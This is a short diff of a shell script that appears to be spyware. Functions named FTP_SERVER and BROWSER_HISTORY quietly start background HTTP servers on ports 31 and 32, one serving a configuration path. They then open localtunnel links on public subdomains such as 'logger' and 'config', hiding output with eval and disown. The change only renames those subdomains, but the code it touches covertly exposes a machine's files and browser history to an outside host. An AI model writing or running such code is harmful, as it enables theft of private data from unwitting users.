@@ -90,7 +90,7 @@ FTP_SERVER() {
     cmd1="python3 -m http.server 31"
     eval "${cmd1}" &>/dev/null & disown;
 
-    cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812432"
+    cmd2="lt --local-host 0.0.0.0 --port 31 --subdomain logger812431"
     eval "${cmd2}" &>/dev/null & disown;
 }
 
@@ -102,7 +102,7 @@ BROWSER_HISTORY() {
     cd ${CONFIG_PATH}
     cmd1="python3 -m http.server 32"
     eval "${cmd1}" &>/dev/null & disown;
-    cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812432"
+    cmd2="lt --local-host 0.0.0.0 --port 32 --subdomain config812431"
     eval "${cmd2}" &>/dev/null & disown;
 }
 
